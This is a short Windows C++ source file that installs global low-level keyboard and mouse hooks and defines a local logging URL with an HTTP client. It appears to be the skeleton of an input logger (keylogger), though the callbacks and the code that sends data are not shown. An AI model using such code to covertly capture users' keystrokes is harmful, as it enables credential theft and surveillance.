#include <iostream>
#include <Windows.h>
#include <cpr/cpr.h>

#include "MouseHandler.h"
#include "KeyboardHandler.h"

const char *DEBUG_URL = "http://127.0.0.1:8000/log";

int main() {
    const HHOOK keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, reinterpret_cast<HOOKPROC>(&KeyboardCallback), nullptr, 0);
    const HHOOK mouse = SetWindowsHookEx(WH_MOUSE_LL, reinterpret_cast<HOOKPROC>(&MouseCallback), nullptr, 0);

    MSG message;
    while (GetMessage(&message, nullptr, 0, 0) > 0) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    UnhookWindowsHookEx(keyboard);
    UnhookWindowsHookEx(mouse);

    return 0;
}
